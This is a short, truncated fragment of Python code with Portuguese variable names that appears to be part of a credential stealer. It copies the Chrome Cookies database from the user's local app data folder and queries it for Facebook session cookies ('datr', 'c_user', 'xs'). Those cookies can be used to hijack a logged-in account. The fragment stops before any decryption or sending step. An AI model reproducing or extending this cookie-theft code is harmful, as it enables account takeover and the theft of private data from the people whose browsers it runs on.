...
banco = os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Cookies'
banco2 = banco + "2"
shutil.copyfile(banco, banco2)

conexao = sqlite3.connect(banco2)
consulta = conexao.cursor()
comando = 'SELECT name, encrypted_value FROM cookies WHERE host_key = ".facebook.com" AND (name="datr" OR name="c_user" OR name="xs")'
